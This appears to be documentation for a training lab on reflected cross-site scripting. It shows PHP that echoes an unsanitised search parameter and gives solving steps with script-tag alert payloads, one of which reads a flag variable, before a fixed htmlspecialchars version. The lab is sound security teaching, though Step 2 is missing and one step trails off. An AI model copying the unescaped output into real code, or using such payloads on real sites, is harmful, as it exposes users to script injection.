## 🔐 Vulnerability Details

### Vulnerable Code Location:
`search_query_xss_lab/index.php` (line ~180)

```php
<!-- VULNERABLE CODE -->
<span id="query-display"><?php echo $search_query; ?></span>
```

### Why It's Vulnerable:
- The `q` parameter from `$_GET['q']` is directly echoed without sanitization
- No use of `htmlspecialchars()` or `htmlentities()`
- No Content Security Policy (CSP)
- No input validation/filtering

### Exploitation Vector:
```
GET /?q=<script>alert(document.domain)</script>
```

## 💡 Clues System (Hidden)

The lab includes **5 different HTML comments** that appear randomly on each page refresh:

1. `<!-- TODO: Implement input sanitization for user queries -->`
2. `<!-- Note: This search page directly displays user input without filtering -->`
3. `<!-- Developer note: Remember to add htmlspecialchars() before output -->`
4. `<!-- FIXME: The 'q' parameter is reflected unsafely in search results -->`
5. `<!-- Security reminder: Never trust user input from GET parameters -->`

### Misleading UI Text:
- Badge: "🔒 Secured by IDS Firewall" (misleading - there is no firewall)
- Text: "Your queries are safe with our advanced input processing system"
- Info: "This page uses advanced filtering technology to ensure safe browsing"

### Step 1: Identify the Parameter
Visit the site and enter a test query like `test123`. Notice the URL becomes:
```
http://localhost:PORT/?q=test123
```

### Step 3: Verify XSS
Try payload: `?q=<script>alert(1)</script>`

### Step 4: Get the Flag
The flag is stored in JavaScript variable `flagData`. Payload:
```
?q=<script>alert(flagData)</script>
```

Or using the built-in validation function:

## 🔒 Security Features (Educational)

### What This Lab Teaches:
1. **Input Validation** - Why GET parameters must be validated
2. **Output Encoding** - Importance of `htmlspecialchars()`
3. **Context Awareness** - Different contexts need different encoding
4. **Security Misconceptions** - UI security badges can be misleading

### Secure Code Example:

```php
<?php
// SECURE VERSION
$search_query = isset($_GET['q']) ? $_GET['q'] : '';
$safe_query = htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8');
?>
<span id="query-display"><?php echo $safe_query; ?></span>
```
